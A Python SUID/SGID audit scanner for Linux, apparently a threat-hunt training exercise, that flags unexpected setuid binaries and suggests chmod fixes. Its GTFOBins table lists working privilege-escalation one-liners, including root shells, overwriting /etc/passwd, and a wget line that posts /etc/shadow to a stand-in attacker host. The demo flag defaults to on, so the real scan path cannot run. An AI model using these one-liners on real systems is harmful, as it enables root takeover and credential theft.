"""
Day 17 — SUID/SGID Audit Scanner
NovaCrest Capital Group | Threat Hunt

PURPOSE: Enumerates SUID and SGID binaries on Linux hosts and assesses
         each against the GTFOBins database to identify binaries that
         can be abused for privilege escalation. Used both offensively
         (red team enumeration simulation) and defensively (blue team
         baseline and anomaly detection).

WHAT IT DOES:
  1. Scans filesystem for binaries with SUID (u+s) or SGID (g+s) bits set
  2. Checks each binary against known GTFOBins escalation paths
  3. Identifies unexpected SUID binaries (not in baseline)
  4. Generates remediation commands (chmod -s) for unexpected binaries
  5. Produces JSON report for SIEM ingestion

SAFE TO RUN: Yes — read-only filesystem scan; no privilege changes.

Usage:
    python suid_audit_scanner.py --scan /      (full filesystem; requires sudo for some paths)
    python suid_audit_scanner.py --demo        (simulated scan results)
    python suid_audit_scanner.py --compare-baseline /tmp/baseline.json
    python suid_audit_scanner.py --report /tmp/suid-report.json
"""

import argparse
import datetime
import json
import os
import stat
import sys
from typing import List, Dict


# ── GTFOBins: Binaries with known SUID escalation paths ───────────────
GTFOBINS_SUID = {
    "bash":       "bash -p  → spawns bash with EUID=0",
    "find":       "find . -exec /bin/bash \\; -quit  → root shell",
    "vim":        "vim -c ':py import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'",
    "python":     "python -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'",
    "python3":    "python3 -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'",
    "perl":       "perl -e 'exec \"/bin/bash\"'",
    "ruby":       "ruby -e 'exec \"/bin/bash\"'",
    "php":        "php -r 'pcntl_exec(\"/bin/bash\", [\"-p\"]);'",
    "nmap":       "nmap --interactive → !sh",
    "less":       "less /etc/passwd → !bash",
    "more":       "more /etc/passwd → !bash",
    "man":        "man man → !bash",
    "awk":        "awk 'BEGIN {system(\"/bin/bash\")}'",
    "nano":       "nano → ^R^X and run command",
    "cp":         "cp /bin/bash /tmp/bash; chmod +s /tmp/bash  → /tmp/bash -p",
    "tee":        "echo root::0:0:root:/root:/bin/bash | tee /etc/passwd",
    "dd":         "dd if=/dev/stdin of=/etc/passwd  → overwrite sensitive files",
    "curl":       "curl file:///etc/shadow  → read sensitive files",
    "wget":       "wget --post-file=/etc/shadow attacker.com  → exfil sensitive files",
    "node":       "node -e 'child_process.spawn(\"/bin/bash\",[\"-p\"])'",
    "env":        "env /bin/bash -p",
    "strace":     "strace -o /dev/null /bin/bash -p",
    "taskset":    "taskset 1 /bin/bash -p",
    "xargs":      "xargs -a /dev/null /bin/bash",
    "base64":     "base64 /etc/shadow | base64 --decode  → read shadow",
    "gdb":        "gdb -nx -ex '!bash' -ex quit",
    "ftp":        "ftp → !/bin/bash",
    "zip":        "zip /tmp/out.zip /etc/shadow -T -TT '/bin/bash -p'",
    "tar":        "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
    "make":       "make -s --eval=$'x:\\n\\t-'\"$'\\t'\"/bin/bash",
}

# ── Baseline: expected SUID binaries on Ubuntu 22.04 ──────────────────
UBUNTU_SUID_BASELINE = {
    "/usr/bin/sudo",
    "/usr/bin/passwd",
    "/usr/bin/gpasswd",
    "/usr/bin/chsh",
    "/usr/bin/chfn",
    "/usr/bin/newgrp",
    "/usr/bin/su",
    "/usr/bin/mount",
    "/usr/bin/umount",
    "/usr/bin/fusermount3",
    "/usr/bin/pkexec",
    "/usr/lib/openssh/ssh-keysign",
    "/usr/lib/dbus-1.0/dbus-daemon-launch-helper",
    "/usr/lib/eject/dmcrypt-get-device",
    "/usr/sbin/pppd",
    "/bin/ping",
    "/bin/su",
    "/sbin/unix_chkpwd",
}

# ── Simulated scan results (demo mode) ────────────────────────────────
SIMULATED_SCAN_RESULTS = [
    {"path": "/usr/bin/sudo",     "mode": "4755", "owner": "root", "baseline": True,  "gtfobins": False},
    {"path": "/usr/bin/passwd",   "mode": "4755", "owner": "root", "baseline": True,  "gtfobins": False},
    {"path": "/usr/bin/mount",    "mode": "4755", "owner": "root", "baseline": True,  "gtfobins": False},
    {"path": "/usr/bin/su",       "mode": "4755", "owner": "root", "baseline": True,  "gtfobins": False},
    {"path": "/usr/bin/find",     "mode": "4755", "owner": "root", "baseline": False, "gtfobins": True,
     "escalation_path": GTFOBINS_SUID["find"],
     "note": "UNEXPECTED SUID — find is not in baseline; GTFOBin escalation possible"},
    {"path": "/usr/bin/python3",  "mode": "4755", "owner": "root", "baseline": False, "gtfobins": True,
     "escalation_path": GTFOBINS_SUID["python3"],
     "note": "UNEXPECTED SUID — python3 with SUID is critical; instant root shell"},
    {"path": "/usr/bin/vim",      "mode": "4755", "owner": "root", "baseline": False, "gtfobins": True,
     "escalation_path": GTFOBINS_SUID["vim"],
     "note": "UNEXPECTED SUID — vim with SUID allows reading/writing any file as root"},
    {"path": "/usr/bin/gpasswd",  "mode": "4755", "owner": "root", "baseline": True,  "gtfobins": False},
    {"path": "/bin/ping",         "mode": "4755", "owner": "root", "baseline": True,  "gtfobins": False},
]


def scan_filesystem(root: str = "/") -> List[Dict]:
    """
    Walk filesystem and find SUID/SGID binaries.
    Returns list of binaries with their attributes.
    """
    results = []
    skipped_dirs = {"/proc", "/sys", "/dev", "/run"}

    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        # Skip virtual filesystems
        dirnames[:] = [d for d in dirnames
                       if os.path.join(dirpath, d) not in skipped_dirs]

        for filename in filenames:
            full_path = os.path.join(dirpath, filename)
            try:
                file_stat = os.lstat(full_path)
                mode = file_stat.st_mode

                is_suid = bool(mode & stat.S_ISUID)
                is_sgid = bool(mode & stat.S_ISGID)

                if not (is_suid or is_sgid):
                    continue

                binary_name = os.path.basename(full_path)
                in_baseline = full_path in UBUNTU_SUID_BASELINE
                gtfobins_match = binary_name.lower() in GTFOBINS_SUID

                result = {
                    "path": full_path,
                    "mode": oct(mode)[-4:],
                    "suid": is_suid,
                    "sgid": is_sgid,
                    "owner_uid": file_stat.st_uid,
                    "baseline": in_baseline,
                    "gtfobins": gtfobins_match,
                }

                if gtfobins_match:
                    result["escalation_path"] = GTFOBINS_SUID[binary_name.lower()]
                    result["risk"] = "CRITICAL" if not in_baseline else "Low"
                else:
                    result["risk"] = "Medium" if not in_baseline else "Low"

                results.append(result)

            except (PermissionError, FileNotFoundError, OSError):
                continue

    return results


def assess_results(results: List[Dict]) -> Dict:
    """Assess SUID scan results and produce summary."""
    unexpected = [r for r in results if not r.get("baseline", True)]
    gtfobins = [r for r in results if r.get("gtfobins", False)]
    critical = [r for r in results if r.get("risk") == "CRITICAL"]

    assessment = {
        "total_suid_sgid": len(results),
        "in_baseline": len([r for r in results if r.get("baseline", False)]),
        "unexpected": len(unexpected),
        "gtfobins_matches": len(gtfobins),
        "critical_risk": len(critical),
        "unexpected_binaries": unexpected,
        "critical_findings": critical,
        "remediation": [
            f"chmod -s {r['path']}  # Remove SUID — {r.get('note', r['path'])}"
            for r in critical
        ],
    }

    return assessment


def emit_scan_report(results: List[Dict], host: str = "lnx-trade-01") -> None:
    """Emit SUID scan report."""
    assessment = assess_results(results)

    report = {
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "scan_type": "SUID/SGID Binary Audit",
        "host": host,
        "baseline": "Ubuntu 22.04 LTS standard SUID baseline",
        "scan_results": results,
        "assessment": assessment,
        "hunt_relevance": {
            "hypothesis": "H3 — SUID/SGID Binary Exploitation (T1548.001)",
            "verdict": "CONFIRMED — unexpected SUID binaries present" if assessment["critical_risk"] > 0 else "NOT FOUND",
            "critical_findings": assessment["critical_findings"],
        },
    }

    print("\n" + "=" * 70)
    print("  SUID/SGID AUDIT REPORT — Day 17")
    print("=" * 70 + "\n")
    print(json.dumps(report, indent=2))
    print("\n" + "=" * 70 + "\n")

    # Human-readable summary
    print("SUID BINARY SUMMARY")
    print("─" * 60)
    print(f"  Total SUID/SGID binaries:  {assessment['total_suid_sgid']}")
    print(f"  In baseline:               {assessment['in_baseline']}")
    print(f"  UNEXPECTED:                {assessment['unexpected']}")
    print(f"  GTFOBins matches:          {assessment['gtfobins_matches']}")
    print(f"  CRITICAL risk:             {assessment['critical_risk']}")
    print()

    if assessment["critical_findings"]:
        print("CRITICAL FINDINGS:")
        for f in assessment["critical_findings"]:
            print(f"  ⚠️  {f['path']:40} → {f.get('escalation_path','')[:50]}")
        print()
        print("REMEDIATION:")
        for cmd in assessment["remediation"]:
            print(f"  $ {cmd}")
    else:
        print("  ✅ No critical SUID findings — baseline matches expected")
    print()


def main():
    parser = argparse.ArgumentParser(description="Day 17 SUID/SGID Audit Scanner")
    parser.add_argument("--scan", metavar="PATH",
                        help="Root path to scan (requires elevated perms for full scan)")
    parser.add_argument("--demo", action="store_true", default=True,
                        help="Use simulated scan results")
    parser.add_argument("--host", default="lnx-trade-01",
                        help="Hostname label for report")
    parser.add_argument("--report", metavar="OUTPUT",
                        help="Write JSON report to file")
    args = parser.parse_args()

    print("[*] Day 17 SUID/SGID Audit Scanner")
    print(f"[*] Host: {args.host}\n")

    if args.scan and not args.demo:
        print(f"[*] Scanning filesystem from: {args.scan}")
        results = scan_filesystem(args.scan)
    else:
        print("[*] Using simulated scan results (demo mode)\n")
        results = SIMULATED_SCAN_RESULTS

    emit_scan_report(results, host=args.host)

    if args.report:
        assessment = assess_results(results)
        with open(args.report, "w") as f:
            json.dump({"results": results, "assessment": assessment}, f, indent=2)
        print(f"[+] Report written to: {args.report}")


if __name__ == "__main__":
    main()
